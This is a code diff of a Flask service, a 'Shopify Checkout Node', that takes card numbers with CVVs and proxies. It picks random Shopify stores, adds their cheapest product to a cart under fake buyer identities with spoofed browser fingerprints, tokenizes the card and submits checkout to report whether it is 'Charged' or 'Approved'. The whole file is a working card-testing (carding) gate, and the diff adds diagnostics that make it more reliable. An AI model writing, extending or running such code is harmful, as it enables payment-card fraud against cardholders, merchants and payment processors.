@@ -1,8 +1,6 @@
 """
 app.py — Shopify Checkout Node (Render / scale plan)
 =====================================================
-Single Flask server. Runs 1 gunicorn worker × N threads so /health
-worker counts are accurate across concurrent requests.
 """
 
 import os
@@ -29,10 +27,36 @@ app = Flask(__name__)
 # ─────────────────────────────────────────────────────────────────────────────
 WORKERS_CAP = int(os.environ.get("WORKERS_CAP", "20"))
 BUDGET_SEC  = float(os.environ.get("BUDGET_SEC", "40"))
-SITE_FILE   = os.environ.get("SITE_FILE", "site.txt")
+
+def _load_sites():
+    env_sites = os.environ.get("SITES", "").strip()
+    if env_sites:
+        parts = re.split(r"[\n,]+", env_sites)
+        return [s.strip() for s in parts if s.strip() and s.strip().startswith("http")]
+
+    here = os.path.dirname(os.path.abspath(__file__))
+    for name in ("site.txt", "sites.txt"):
+        p = os.path.join(here, name)
+        if os.path.exists(p):
+            with open(p) as f:
+                return [l.strip() for l in f if l.strip() and not l.startswith("#") and l.strip().startswith("http")]
+    return []
+
+_SITES_CACHE = None
+_SITES_CACHE_TS = 0.0
+_SITES_LOCK = threading.Lock()
+
+def _get_sites():
+    global _SITES_CACHE, _SITES_CACHE_TS
+    now = time.monotonic()
+    with _SITES_LOCK:
+        if _SITES_CACHE is None or now - _SITES_CACHE_TS > 60:
+            _SITES_CACHE = _load_sites()
+            _SITES_CACHE_TS = now
+    return _SITES_CACHE
 
 # ─────────────────────────────────────────────────────────────────────────────
-# ⚡ WORKER COUNTER  +  DEBUG STORE
+# ⚡ WORKER COUNTER + DEBUG
 # ─────────────────────────────────────────────────────────────────────────────
 _workers_busy = 0
 _workers_lock = threading.Lock()
@@ -45,13 +69,18 @@ def _dec_busy():
     global _workers_busy
     with _workers_lock: _workers_busy = max(0, _workers_busy - 1)
 
-_last_failure = {}   # ← FIX: filled on each PAYMENT failure
+_last_failure = {}
+
+def _fail(reason, **extra):
+    global _last_failure
+    _last_failure = {"reason": reason, "ts": int(time.time()), **extra}
+    print(f"[FAIL] {reason} | {extra}", flush=True)
+    return _resp(f"PROPOSAL_FAILED_{reason}")
 
 # ─────────────────────────────────────────────────────────────────────────────
-# ⚡ TLS FINGERPRINTS
+# ⚡ TLS
 # ─────────────────────────────────────────────────────────────────────────────
-BROWSER_PROFILES = ["chrome124", "chrome120", "chrome116", "chrome110", "edge101", "safari15_5"]
-
+BROWSER_PROFILES = ["chrome124","chrome120","chrome116","chrome110","edge101","safari15_5"]
 USER_AGENTS = [
     "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36",
     "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36 Edg/123.0.0.0",
@@ -64,7 +93,6 @@ USER_AGENTS = [
 FIRST_NAMES   = ["james","john","robert","michael","william","david","richard","joseph","thomas","charles"]
 LAST_NAMES    = ["smith","johnson","williams","brown","jones","garcia","miller","davis","rodriguez","martinez"]
 EMAIL_DOMAINS = ["gmail.com","yahoo.com","outlook.com","hotmail.com"]
-
 ADDRESSES = [
     {"street":"100 SW Main St",           "city":"Portland",  "state":"OR","zip":"97204","phone":"+15035550100"},
     {"street":"223 Pioneer Blvd",         "city":"Salem",     "state":"OR","zip":"97301","phone":"+15035550101"},
@@ -77,20 +105,12 @@ def _identity():
     fn = random.choice(FIRST_NAMES)
     ln = random.choice(LAST_NAMES)
     email = f"{fn.lower()}.{ln.lower()}{random.randint(1,9999)}@{random.choice(EMAIL_DOMAINS)}"
-    a = random.choice(ADDRESSES)
-    return fn, ln, email, a
+    return fn, ln, email, random.choice(ADDRESSES)
 
 def _street_addr(fn, ln, a):
-    return {
-        "address1":    a["street"],
-        "city":        a["city"],
-        "countryCode": "US",
-        "postalCode":  a["zip"],
-        "firstName":   fn,
-        "lastName":    ln,
-        "zoneCode":    a["state"],
-        "phone":       a["phone"],
-    }
+    return {"address1":a["street"],"city":a["city"],"countryCode":"US",
+            "postalCode":a["zip"],"firstName":fn,"lastName":ln,
+            "zoneCode":a["state"],"phone":a["phone"]}
 
 def _rand_suffix(n=10):
     return ''.join(random.choices(string.ascii_lowercase + string.digits, k=n))
@@ -109,18 +129,15 @@ def _parse_proxy(s):
     if len(parts) == 2: return f"socks5h://{parts[0]}:{parts[1]}"
     if len(parts) >= 4:
         host, port, user = parts[0], parts[1], parts[2]
-        pw = ":".join(parts[3:])
-        return f"socks5h://{user}:{pw}@{host}:{port}"
+        return f"socks5h://{user}:{':'.join(parts[3:])}@{host}:{port}"
     return f"socks5h://{p}"
 
 # ─────────────────────────────────────────────────────────────────────────────
-# 🔍 BASIC EXTRACTIONS
+# 🔍 EXTRACTIONS
 # ─────────────────────────────────────────────────────────────────────────────
 def _session_token(h):
-    for pat in (
-        r'<meta\s+name="serialized-sessionToken"\s+content="([^"]*)"',
-        r'"sessionToken"\s*:\s*"([^"]+)"',
-    ):
+    for pat in (r'<meta\s+name="serialized-sessionToken"\s+content="([^"]*)"',
+                r'"sessionToken"\s*:\s*"([^"]+)"'):
         m = re.search(pat, h)
         if m:
             t = html.unescape(m.group(1)).strip('"\'')
@@ -133,168 +150,130 @@ def _commit_sha(h):
 def _stable_id(h):
     m = re.search(r'"stableId"\s*:\s*"([0-9a-f-]{36})"', html.unescape(h)); return m.group(1) if m else ""
 
-def _queue_token(body):
-    m = re.search(r'"queueToken"\s*:\s*"([^"]+)"', body); return m.group(1) if m else ""
+def _queue_token(b):
+    m = re.search(r'"queueToken"\s*:\s*"([^"]+)"', b); return m.group(1) if m else ""
 
-def _receipt_id(body):
-    m = re.search(r'"id"\s*:\s*"(gid://shopify/\w+Receipt/[A-Za-z0-9]+)"', body); return m.group(1) if m else ""
+def _receipt_id(b):
+    m = re.search(r'"id"\s*:\s*"(gid://shopify/\w+Receipt/[A-Za-z0-9]+)"', b); return m.group(1) if m else ""
 
-def _receipt_session(body):
-    m = re.search(r'"sessionToken"\s*:\s*"([^"]+)"', body); return m.group(1) if m else ""
+def _receipt_session(b):
+    m = re.search(r'"sessionToken"\s*:\s*"([^"]+)"', b); return m.group(1) if m else ""
 
-def _code(body):
-    m = re.search(r'"code"\s*:\s*"([^"]+)"', body); return m.group(1) if m else ""
+def _code(b):
+    m = re.search(r'"code"\s*:\s*"([^"]+)"', b); return m.group(1) if m else ""
 
-# ─────────────────────────────────────────────────────────────────────────────
-# 🔍 RICH EXTRACTIONS
-# ─────────────────────────────────────────────────────────────────────────────
-def _signed_handles(body):
+def _signed_handles(b):
     try:
-        d = json.loads(body)
+        d = json.loads(b)
         sp = (d.get("data",{}).get("session",{}).get("negotiate",{})
                .get("result",{}).get("sellerProposal",{}))
         de = sp.get("deliveryExpectations",{})
         if de.get("__typename") == "FilledDeliveryExpectationTerms":
             return [x["signedHandle"] for x in de.get("deliveryExpectations",[]) if x.get("signedHandle")]
-    except Exception:
-        pass
+    except Exception: pass
     return []
 
-def _delivery_handle(body):
+def _delivery_handle(b):
     try:
-        d = json.loads(body)
+        d = json.loads(b)
         sp = (d.get("data",{}).get("session",{}).get("negotiate",{})
                .get("result",{}).get("sellerProposal",{}))
         sds = sp.get("selectedDeliveryStrategy",{})
-        if isinstance(sds, dict) and sds.get("handle"):
-            return sds["handle"]
+        if isinstance(sds, dict) and sds.get("handle"): return sds["handle"]
         for dg in sp.get("deliveryGroups",[]):
             for opt in dg.get("deliveryOptions",[]):
-                if isinstance(opt, dict) and opt.get("handle"):
-                    return opt["handle"]
-    except Exception:
-        pass
-    for pat in (
-        r'"selectedDeliveryStrategy"\s*:\s*\{[^{}]*"handle"\s*:\s*"([^"]+)"',
-        r'"__typename"\s*:\s*"CompleteDeliveryStrategy"[^{}]*"handle"\s*:\s*"([^"]+)"',
-    ):
-        m = re.search(pat, body)
+                if isinstance(opt, dict) and opt.get("handle"): return opt["handle"]
+    except Exception: pass
+    for pat in (r'"selectedDeliveryStrategy"\s*:\s*\{[^{}]*"handle"\s*:\s*"([^"]+)"',
+                r'"__typename"\s*:\s*"CompleteDeliveryStrategy"[^{}]*"handle"\s*:\s*"([^"]+)"'):
+        m = re.search(pat, b)
         if m: return m.group(1)
     return ""
 
-def _checkout_total(body):
-    m = re.search(r'"checkoutTotal"\s*:\s*\{\s*"value"\s*:\s*\{\s*"amount"\s*:\s*"([^"]+)"', body)
+def _checkout_total(b):
+    m = re.search(r'"checkoutTotal"\s*:\s*\{\s*"value"\s*:\s*\{\s*"amount"\s*:\s*"([^"]+)"', b)
     return m.group(1) if m else ""
 
-def _tax_amount(body):
+def _tax_amount(b):
     try:
-        d = json.loads(body)
+        d = json.loads(b)
         sp = (d.get("data",{}).get("session",{}).get("negotiate",{})
                .get("result",{}).get("sellerProposal",{}))
         return sp.get("tax",{}).get("totalTaxAmount",{}).get("value",{}).get("amount","0.0")
-    except Exception:
-        return "0.0"
+    except Exception: return "0.0"
 
-def _tax_from_rejected(submit_body):
+def _tax_from_rejected(b):
     try:
-        d = json.loads(submit_body)
+        d = json.loads(b)
         sp = d.get("data",{}).get("submitForCompletion",{}).get("sellerProposal",{})
         return sp.get("tax",{}).get("totalTaxAmount",{}).get("value",{}).get("amount","0.0")
-    except Exception:
-        return "0.0"
+    except Exception: return "0.0"
 
-def _total_from_rejected(submit_body):
+def _total_from_rejected(b):
     try:
-        d = json.loads(submit_body)
+        d = json.loads(b)
         sp = d.get("data",{}).get("submitForCompletion",{}).get("sellerProposal",{})
         for k in ("checkoutTotal","total","runningTotal"):
             v = sp.get(k,{}).get("value",{}).get("amount")
             if v: return v
-    except Exception:
-        pass
+    except Exception: pass
     return ""
 
-# ═══ FIX: robust payment-method extraction (tries many field names) ═══
-def _payment_method_id(body):
-    """
-    Returns the payment method identifier, prioritising 'shopify_payments'.
-    Tries, in order:
-      1. paymentMethodIdentifier  (camelCase, canonical)
-      2. payment_method_identifier (snake_case)
-      3. identifier/handle/id  on any 'Payment*' or 'DirectPayment*' typename
-    """
-    # Try JSON walk first
+def _is_shipping_required(b):
     try:
-        data = json.loads(body)
+        d = json.loads(b)
+        sp = (d.get("data",{}).get("session",{}).get("negotiate",{})
+               .get("result",{}).get("sellerProposal",{}))
+        return sp.get("isShippingRequired", True)
+    except Exception: return True
+
+def _payment_method_id(b):
+    try:
+        data = json.loads(b)
     except Exception:
-        # Regex-only fallback
-        for pat in (
-            r'"paymentMethodIdentifier"\s*:\s*"([^"]{4,})"',
-            r'"payment_method_identifier"\s*:\s*"([^"]{4,})"',
-        ):
-            m = re.search(pat, body)
+        for pat in (r'"paymentMethodIdentifier"\s*:\s*"([^"]{4,})"',
+                    r'"payment_method_identifier"\s*:\s*"([^"]{4,})"'):
+            m = re.search(pat, b)
             if m: return m.group(1)
         return ""
 
     candidates = []
     def walk(o, ctx=""):
         if isinstance(o, dict):
-            tn   = str(o.get("__typename",""))
+            tn = str(o.get("__typename",""))
             name = str(o.get("name","")).lower()
-
-            # Priority 0: canonical camelCase
             v = o.get("paymentMethodIdentifier")
             if isinstance(v, str) and len(v) > 3:
                 candidates.append((0, "shopify" in name, v))
-
-            # Priority 1: snake_case
             v = o.get("payment_method_identifier")
             if isinstance(v, str) and len(v) > 3:
                 candidates.append((1, "shopify" in name, v))
-
-            # Priority 2: only inside a Payment-shaped object
             if "payment" in tn.lower() or "payment" in ctx.lower():
                 for k in ("identifier","handle","paymentMethodId","id"):
                     v = o.get(k)
                     if isinstance(v, str) and len(v) > 3 and not v.startswith("gid:"):
                         candidates.append((2, ("shopify" in name) or ("card" in name), v))
                         break
-
             for k, v in o.items():
                 walk(v, tn or ctx)
         elif isinstance(o, list):
             for x in o: walk(x, ctx)
-
     walk(data)
-    if not candidates:
-        return ""
+    if not candidates: return ""
     candidates.sort(key=lambda c: (c[0], not c[1]))
     return candidates[0][2]
 
-# ═══ FIX: HTML fallback — search checkout page for identifier ═══
 def _payment_method_id_from_html(h):
     h = h.replace('&quot;','"').replace('&#34;','"')
-    for pat in (
-        r'"paymentMethodIdentifier"\s*:\s*"([^"]{4,})"',
-        r'"payment_method_identifier"\s*:\s*"([^"]{4,})"',
-        r'paymentMethodId["\']?\s*[:=]\s*["\']([^"\']{4,})["\']',
-    ):
+    for pat in (r'"paymentMethodIdentifier"\s*:\s*"([^"]{4,})"',
+                r'"payment_method_identifier"\s*:\s*"([^"]{4,})"',
+                r'paymentMethodId["\']?\s*[:=]\s*["\']([^"\']{4,})["\']'):
         m = re.search(pat, h)
         if m: return m.group(1)
     return ""
 
-# ═══ FIX: digital product detection ═══
-def _is_shipping_required(body):
-    try:
-        d = json.loads(body)
-        sp = (d.get("data",{}).get("session",{}).get("negotiate",{})
-               .get("result",{}).get("sellerProposal",{}))
-        return sp.get("isShippingRequired", True)
-    except Exception:
-        return True
-
 # ─────────────────────────────────────────────────────────────────────────────
-# 🔑 GRAPHQL IDS
+# 🔑 GRAPHQL IDS & PRODUCTS
 # ─────────────────────────────────────────────────────────────────────────────
 def _graphql_ids(session, shop_url, checkout_html, ua):
     m = re.search(r'(/cdn/shopifycloud/checkout-web/assets/c1/actions[A-Za-z0-9_-]*\.[A-Za-z0-9_-]+\.js)', checkout_html)
@@ -308,16 +287,13 @@ def _graphql_ids(session, shop_url, checkout_html, ua):
     except Exception:
         return None, None, None
 
-# ─────────────────────────────────────────────────────────────────────────────
-# 🛍️ CHEAPEST PRODUCT
-# ─────────────────────────────────────────────────────────────────────────────
 def _cheapest_product(session, shop_url, ua, timeout=8):
-    for ep in (
-        f"{shop_url}/products.json?limit=250",
-        f"{shop_url}/collections/all/products.json?limit=250",
-    ):
+    diag = []
+    for ep in (f"{shop_url}/products.json?limit=250",
+               f"{shop_url}/collections/all/products.json?limit=250"):
         try:
             r = session.get(ep, headers={"user-agent": ua}, timeout=timeout)
+            diag.append((ep.split(shop_url)[-1], r.status_code))
             if r.status_code != 200: continue
             data = r.json()
             best_price = float("inf"); best_vid = None; best_pstr = ""
@@ -327,34 +303,25 @@ def _cheapest_product(session, shop_url, ua, timeout=8):
                     try: price = float(str(v.get("price","0")).replace(",","."))
                     except Exception: continue
                     if price > 0 and price < best_price:
-                        best_price = price
-                        best_vid   = str(v.get("id"))
-                        best_pstr  = str(v.get("price","")) or str(best_price)
-            if best_vid: return best_vid, best_pstr
-        except Exception:
-            continue
-    return None, None
+                        best_price, best_vid, best_pstr = price, str(v.get("id")), str(v.get("price","")) or str(best_price)
+            if best_vid: return best_vid, best_pstr, diag
+        except Exception as e:
+            diag.append((ep.split(shop_url)[-1], f"exc:{str(e)[:40]}"))
+    return None, None, diag
 
 # ─────────────────────────────────────────────────────────────────────────────
-# 🛒 PROPOSAL PAYLOAD (with `lines` fix)
+# 🛒 RESTORED PROPOSAL PAYLOAD
 # ─────────────────────────────────────────────────────────────────────────────
-def _proposal_payload(session_token, stable_id, variant_id, amount, currency,
-                      email, addr, proposal_id):
+def _proposal_payload(session_token, stable_id, vid, amount, currency, email, addr, proposal_id):
     if addr:
         sa   = _street_addr(addr["fn"], addr["ln"], addr)
-        dest = {"partialStreetAddress": {
-            "address1": sa["address1"], "city": sa["city"], "countryCode": "US",
-            "lastName": sa["lastName"], "phone": "", "oneTimeUse": False,
-        }}
+        dest = {"partialStreetAddress": {"address1":sa["address1"],"city":sa["city"],
+                "countryCode":"US","lastName":sa["lastName"],"phone":"","oneTimeUse":False}}
         bill = {"streetAddress": sa}
     else:
-        dest = {"partialStreetAddress": {
-            "address1":"","city":"","countryCode":"US","lastName":"","phone":"","oneTimeUse":False,
-        }}
-        bill = None
-
-    payment = {"totalAmount": {"any": True}, "paymentLines": []}
-    if bill: payment["billingAddress"] = bill
+        dest = {"partialStreetAddress": {"address1":"","city":"","countryCode":"US",
+                "lastName":"","phone":"","oneTimeUse":False}}
+        bill = {"streetAddress": {"address1":"","city":"","countryCode":"US","lastName":"","phone":""}}
 
     return {
         "variables": {
@@ -376,31 +343,60 @@ def _proposal_payload(session_token, stable_id, variant_id, amount, currency,
                     "expectedTotalPrice":     {"any": True},
                     "destinationChanged":     True,
                 }],
-                "noDeliveryRequired":    [],
-                "useProgressiveRates":   False,
-                "supportsSplitShipping": True,
+                "noDeliveryRequired":             [],
+                "useProgressiveRates":            False,
+                "prefetchShippingRatesStrategy":  None,
+                "supportsSplitShipping":          True,
             },
             "deliveryExpectations": {"deliveryExpectationLines": []},
-            "merchandise": {"lines": [{                             # ← FIX
+            "merchandise": {"lines": [{
                 "stableId": stable_id,
                 "merchandise": {"productVariantReference": {
-                    "id":        f"gid://shopify/ProductVariantMerchandise/{variant_id}",
-                    "variantId": f"gid://shopify/ProductVariant/{variant_id}",
+                    "id":        f"gid://shopify/ProductVariantMerchandise/{vid}",
+                    "variantId": f"gid://shopify/ProductVariant/{vid}",
+                    "properties":         [],
+                    "sellingPlanId":      None,
+                    "sellingPlanDigest":  None,
                 }},
-                "quantity":           {"items": {"value": 1}},
-                "expectedTotalPrice": {"value": {"amount": amount, "currencyCode": currency}},
+                "quantity":             {"items": {"value": 1}},
+                "expectedTotalPrice":   {"any": True},
+                "lineComponentsSource": None,
+                "lineComponents":       [],
             }]},
             "memberships": {"memberships": []},
-            "payment":     payment,
+            "payment": {
+                "totalAmount": {"any": True},
+                "paymentLines": [],
+                "billingAddress": bill,
+            },
             "buyerIdentity": {
                 "customer":         {"presentmentCurrency": currency, "countryCode": "US"},
                 "email":            email or None,
                 "emailChanged":     bool(email),
                 "phoneCountryCode": "US",
                 "marketingConsent": [],
+                "shopPayOptInPhone": {"countryCode": "US"},
                 "rememberMe":       False,
             },
-            "taxes": {"proposedTotalAmount": {"any": True}},
+            "tip": {"tipLines": []},
+            "poNumber": None,
+            "taxes": {
+                "proposedAllocations":             None,
+                "proposedTotalAmount":             {"any": True},
+                "proposedTotalIncludedAmount":     None,
+                "proposedMixedStateTotalAmount":   None,
+                "proposedExemptions":              [],
+            },
+            "note": {"message": None, "customAttributes": []},
+            "localizationExtension": {"fields": []},
+            "nonNegotiableTerms": None,
+            "scriptFingerprint": {
+                "signature": None, "signatureUuid": None,
+                "lineItemScriptChanges": [], "paymentScriptChanges": [],
+                "shippingScriptChanges": [],
+            },
+            "optionalDuties": {"buyerRefusesDuties": False},
+            "cartMetafields": [],
         },
         "operationName": "Proposal",
         "id": proposal_id,
@@ -413,33 +409,24 @@ def _tokenize(session, ccn, mm, yyyy, cvv, name, shop_domain, ua):
     try:
         r = session.post(
             "https://checkout.pci.shopifyinc.com/sessions",
-            json={
-                "credit_card": {
-                    "number": ccn, "month": int(mm), "year": int(yyyy),
-                    "verification_value": cvv, "name": name,
-                },
-                "payment_session_scope": shop_domain,
-            },
+            json={"credit_card": {"number":ccn,"month":int(mm),"year":int(yyyy),
+                                  "verification_value":cvv,"name":name},
+                  "payment_session_scope": shop_domain},
             headers={"origin":"https://checkout.pci.shopifyinc.com","user-agent":ua},
             timeout=8,
         )
         if r.status_code == 200: return r.json().get("id")
-    except Exception:
-        pass
+    except Exception: pass
     return None
 
 # ─────────────────────────────────────────────────────────────────────────────
-# 📤 RESPONSE HELPERS
+# 📤 RESPONSE
 # ─────────────────────────────────────────────────────────────────────────────
 def _resp(response, *, charged=False, approved=False, price="0 USD", elapsed_ms=None):
-    d = {
-        "Response": response,
-        "Gate":     "Shopify Payments",
-        "Charged":  "True" if charged  else "False",
-        "Approved": "True" if approved else "False",
-        "Price":    price,
-        "success":  charged or approved,
-    }
+    d = {"Response": response, "Gate": "Shopify Payments",
+         "Charged": "True" if charged else "False",
+         "Approved": "True" if approved else "False",
+         "Price": price, "success": charged or approved}
     if elapsed_ms is not None: d["Time"] = str(int(elapsed_ms))
     return jsonify(d)
 
@@ -454,10 +441,9 @@ def _classify_failed(code):
     return (c or "CARD_DECLINED"), False, False
 
 # ─────────────────────────────────────────────────────────────────────────────
-# 🧠 CHECK PIPELINE
+# 🧠 PIPELINE
 # ─────────────────────────────────────────────────────────────────────────────
 def _run_check(card_str, proxy_str):
-    global _last_failure
     t_start = time.monotonic()
     def remain(): return BUDGET_SEC - (time.monotonic() - t_start)
 
@@ -466,12 +452,9 @@ def _run_check(card_str, proxy_str):
     ccn, mm, yy, cvv = parts[0], parts[1], parts[2], parts[3]
     yyyy = "20" + yy if len(yy) == 2 else yy
 
-    try:
-        with open(SITE_FILE, "r") as f:
-            sites = [l.strip() for l in f if l.strip()]
-    except Exception:
-        sites = []
-    if not sites: return _resp("PROPOSAL_FAILED")
+    sites = _get_sites()
+    if not sites:
+        return _fail("NO_SITES", hint="set SITES env var or upload site.txt")
 
     shop_url  = random.choice(sites)
     proxy_url = _parse_proxy(proxy_str)
@@ -482,20 +465,22 @@ def _run_check(card_str, proxy_str):
     if proxy_url: session.proxies = {"http": proxy_url, "https": proxy_url}
 
     try:
-        # ── 1. Cheapest product ────────────────────────────────────────────
-        vid, price = _cheapest_product(session, shop_url, ua, timeout=min(8, max(3, remain())))
-        if not vid: return _resp("PROPOSAL_FAILED")
-        if remain() < 28: return _resp("PROPOSAL_FAILED")
-
-        # ── 2. Cart → Checkout ─────────────────────────────────────────────
         try:
-            r = session.get(
-                f"{shop_url}/cart/{vid}:1",
-                headers={"user-agent": ua},
-                allow_redirects=True, timeout=min(10, max(3, remain())),
-            )
-        except Exception: return _resp("CART_FAILED")
-        if r.status_code != 200: return _resp("CART_FAILED")
+            vid, price, diag = _cheapest_product(session, shop_url, ua, timeout=min(8, max(3, remain())))
+        except Exception as e:
+            return _fail("CHEAPEST_EXC", shop=shop_url, err=str(e)[:100])
+        if not vid:
+            return _fail("NO_PRODUCTS", shop=shop_url, endpoints=diag)
+        if remain() < 20:
+            return _fail("BUDGET_AFTER_PRODUCT", elapsed=f"{BUDGET_SEC-remain():.1f}s")
+
+        try:
+            r = session.get(f"{shop_url}/cart/{vid}:1", headers={"user-agent": ua},
+                            allow_redirects=True, timeout=min(10, max(3, remain())))
+        except Exception:
+            return _resp("CART_FAILED", price=f"{price} USD")
+        if r.status_code != 200:
+            return _resp("CART_FAILED", price=f"{price} USD")
 
         checkout_url  = r.url
         checkout_html = r.text
@@ -504,11 +489,11 @@ def _run_check(card_str, proxy_str):
         session_token = _session_token(checkout_html)
         commit_sha    = _commit_sha(checkout_html)
         stable_id     = _stable_id(checkout_html)
-        if not (session_token and commit_sha and stable_id):
-            return _resp("MISSING_STABLE_ID")
-        if remain() < 24: return _resp("PROPOSAL_FAILED")
+        if not session_token: return _fail("NO_SESSION_TOKEN",  shop=shop_url)
+        if not commit_sha:    return _fail("NO_COMMIT_SHA",     shop=shop_url)
+        if not stable_id:     return _fail("NO_STABLE_ID",      shop=shop_url)
+        if remain() < 16:     return _fail("BUDGET_AFTER_CHECKOUT", shop=shop_url)
 
-        # ── 3. GraphQL IDs ─────────────────────────────────────────────────
         prop_id, submit_id, poll_id = _graphql_ids(session, shop_url, checkout_html, ua)
         prop_id   = prop_id   or "6d9f0eb3d750c837c721c99da1ec1c7f1ce832d3687c5d0d0ffc1b42a610d3e8"
         submit_id = submit_id or "b3fd8db496438a6859c96db264b77e84b3f093d11a44c4d0a84d43e661f12419"
@@ -522,7 +507,6 @@ def _run_check(card_str, proxy_str):
         m = re.search(r'"runningTotal"\s*:\s*\{\s*"value"\s*:\s*\{"amount"\s*:\s*"([\d.]+)"', checkout_html)
         if m: amount = m.group(1)
 
-        # ── 4. Identity ────────────────────────────────────────────────────
         fn, ln, email, addr_raw = _identity()
         addr = {"fn":fn,"ln":ln,"street":addr_raw["street"],"city":addr_raw["city"],
                 "state":addr_raw["state"],"zip":addr_raw["zip"],"phone":addr_raw["phone"]}
@@ -540,58 +524,62 @@ def _run_check(card_str, proxy_str):
         }
         prop_url = f"{shop_url}/checkouts/internal/graphql/persisted?operationName=Proposal"
 
-        # ── 4a. Proposal 1 (empty) ────────────────────────────────────────
+        # ── 4a. Proposal 1 ────────────────────────────────────────────────
         try:
             p = _proposal_payload(session_token, stable_id, vid, amount, currency, None, None, prop_id)
             r1 = session.post(prop_url, headers=hdr, json=p, timeout=min(8, max(3, remain())))
-        except Exception: return _resp("PROPOSAL_FAILED")
-        if r1.status_code != 200: return _resp("PROPOSAL_FAILED")
+        except Exception as e:
+            return _fail("P1_EXC", shop=shop_url, err=str(e)[:100])
+        if r1.status_code != 200:
+            return _fail("P1_HTTP", shop=shop_url, status=r1.status_code, body=r1.text[:800])
         queue_token = _queue_token(r1.text) or None
-        if remain() < 18: return _resp("PROPOSAL_FAILED")
+        if not queue_token:
+            return _fail("P1_NO_QUEUE", shop=shop_url, body=r1.text[:800])
+        if remain() < 12:
+            return _fail("BUDGET_AFTER_P1", shop=shop_url)
 
-        # ── 4b. Proposal 2 (email) ────────────────────────────────────────
+        # ── 4b. Proposal 2 ────────────────────────────────────────────────
         try:
             p = _proposal_payload(session_token, stable_id, vid, amount, currency, email, None, prop_id)
             p["variables"]["queueToken"] = queue_token
             r2 = session.post(prop_url, headers=hdr, json=p, timeout=min(8, max(3, remain())))
-        except Exception: return _resp("PROPOSAL_FAILED")
-        if r2.status_code != 200: return _resp("PROPOSAL_FAILED")
+        except Exception as e:
+            return _fail("P2_EXC", shop=shop_url, err=str(e)[:100])
+        if r2.status_code != 200:
+            return _fail("P2_HTTP", shop=shop_url, status=r2.status_code, body=r2.text[:800])
 
-        # ── 4c. Proposal 3 (address) ──────────────────────────────────────
+        # ── 4c. Proposal 3 ────────────────────────────────────────────────
         try:
             p = _proposal_payload(session_token, stable_id, vid, amount, currency, email, addr, prop_id)
             p["variables"]["queueToken"] = queue_token
             r3 = session.post(prop_url, headers=hdr, json=p, timeout=min(8, max(3, remain())))
-        except Exception: return _resp("PROPOSAL_FAILED")
-        if r3.status_code != 200: return _resp("PROPOSAL_FAILED")
+        except Exception as e:
+            return _fail("P3_EXC", shop=shop_url, err=str(e)[:100])
+        if r3.status_code != 200:
+            return _fail("P3_HTTP", shop=shop_url, status=r3.status_code, body=r3.text[:800])
 
-        # ═══ FIX: collect best-of from all proposal bodies ═══
+        # ── 4d. Extra proposals ───────────────────────────────────────────
         bodies = [r3.text]
-        pm_id      = _payment_method_id(r3.text)
-        del_h      = _delivery_handle(r3.text)
-        signed     = _signed_handles(r3.text)
-        tax        = _tax_amount(r3.text)
-        amount_f   = _checkout_total(r3.text) or amount
+        pm_id  = _payment_method_id(r3.text)
+        del_h  = _delivery_handle(r3.text)
+        signed = _signed_handles(r3.text)
+        tax    = _tax_amount(r3.text)
+        amount_f = _checkout_total(r3.text) or amount
         queue_token = _queue_token(r3.text) or queue_token
-
         shipping_required = _is_shipping_required(r3.text)
 
-        # ═══ FIX: make up to 3 extra proposals to trigger payment availability ═══
-        for extra in range(3):
-            have_all = pm_id and (signed or not shipping_required) and (del_h or not shipping_required)
-            if have_all:
+        for _ in range(3):
+            if pm_id and (signed or not shipping_required) and (del_h or not shipping_required):
                 break
-            if remain() < 10:
+            if remain() < 8:
                 break
             time.sleep(0.05)
             try:
                 p = _proposal_payload(session_token, stable_id, vid, amount, currency, email, addr, prop_id)
                 p["variables"]["queueToken"] = queue_token
                 rN = session.post(prop_url, headers=hdr, json=p, timeout=min(8, max(3, remain())))
-                if rN.status_code != 200:
-                    continue
+                if rN.status_code != 200: continue
                 bodies.append(rN.text)
-
                 nq = _queue_token(rN.text)
                 if nq: queue_token = nq
                 np = _payment_method_id(rN.text)
@@ -607,36 +595,24 @@ def _run_check(card_str, proxy_str):
             except Exception:
                 continue
 
-        # ═══ FIX: HTML fallback for payment method ═══
         if not pm_id:
             pm_id = _payment_method_id_from_html(checkout_html)
 
-        # ═══ FIX: capture debug snapshot on failure ═══
         if not pm_id:
-            last_body = bodies[-1] if bodies else ""
-            _last_failure = {
-                "site":     shop_url,
-                "card_prefix": ccn[:6] + "******",
-                "proposals": len(bodies),
-                "shipping_required": shipping_required,
-                "last_len": len(last_body),
-                "last_snippet": last_body[:2000],
-                "found_pm_keys": [k for k in (
-                    "paymentMethodIdentifier","payment_method_identifier","directPaymentMethod"
-                ) if k in last_body],
-            }
-            return _resp("PAYMENTS_CREDIT_CARD_NOT_AVAILABLE")
+            return _fail("NO_PAYMENT_ID", shop=shop_url, proposals=len(bodies),
+                         body=bodies[-1][:800] if bodies else "")
 
-        if shipping_required and (not signed or not del_h):
-            return _resp("PROPOSAL_FAILED")
-        if remain() < 8: return _resp("PROPOSAL_FAILED")
+        if shipping_required and not signed:
+            return _fail("NO_SIGNED_HANDLES", shop=shop_url, proposals=len(bodies))
+        if shipping_required and not del_h:
+            return _fail("NO_DELIVERY_HANDLE", shop=shop_url, proposals=len(bodies))
+        if remain() < 6:
+            return _fail("BUDGET_AFTER_PROPOSALS", shop=shop_url)
 
-        # ── 5. PCI ─────────────────────────────────────────────────────────
         sid = _tokenize(session, ccn, mm, yyyy, cvv, f"{fn} {ln}", shop_url.split("//")[1], ua)
-        if not sid: return _resp("PCI_FAILED")
-        if remain() < 6: return _resp("PCI_FAILED")
+        if not sid: return _resp("PCI_FAILED", price=f"{amount_f} {currency}")
+        if remain() < 4: return _fail("BUDGET_AFTER_PCI", shop=shop_url)
 
-        # ── 6. Submit ──────────────────────────────────────────────────────
         sa        = _street_addr(fn, ln, addr_raw)
         price_str = f"{amount_f} {currency}"
 
@@ -659,21 +635,27 @@ def _run_check(card_str, proxy_str):
                                 "expectedTotalPrice":     {"any": True},
                                 "destinationChanged":     False,
                             }],
-                            "noDeliveryRequired":    [],
-                            "useProgressiveRates":   False,
-                            "supportsSplitShipping": True,
+                            "noDeliveryRequired":            [],
+                            "useProgressiveRates":           False,
+                            "prefetchShippingRatesStrategy": None,
+                            "supportsSplitShipping":         True,
                         },
                         "deliveryExpectations": {
                             "deliveryExpectationLines": [{"signedHandle": h} for h in signed],
                         },
